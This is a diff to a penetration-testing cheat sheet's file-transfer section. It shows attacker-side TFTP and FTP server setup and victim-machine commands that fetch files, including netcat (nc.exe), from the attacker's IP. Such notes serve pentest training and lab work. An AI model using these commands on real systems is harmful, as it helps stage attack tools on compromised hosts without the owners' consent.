@@ -189,15 +189,10 @@ TFTP
 
 ```
 m0chan Machine
-
 mkdir tftp
-
 atftpd --deamon --port 69 tftp
-
 cp *file* tftp
-
 On victim machine:
-
 tftp -i <[IP]> GET <[FILE]>
 ```
 
@@ -205,19 +200,18 @@ tftp -i <[IP]> GET <[FILE]>
 
 FTP
 
-```
+```powershell
+#Start FTP Server on Kali 
+
+python -m pyftpdlib
+
+#Target Machine
 echo open <[IP]> 21 > ftp.txt
-
 echo USER demo >> ftp.txt
-
 echo ftp >> ftp.txt
-
 echo bin >> ftp.txt
-
 echo GET nc.exe >> ftp.txt
-
 echo bye >> ftp.txt
-
 ftp -v -n -s:ftp.txt
 ```
 
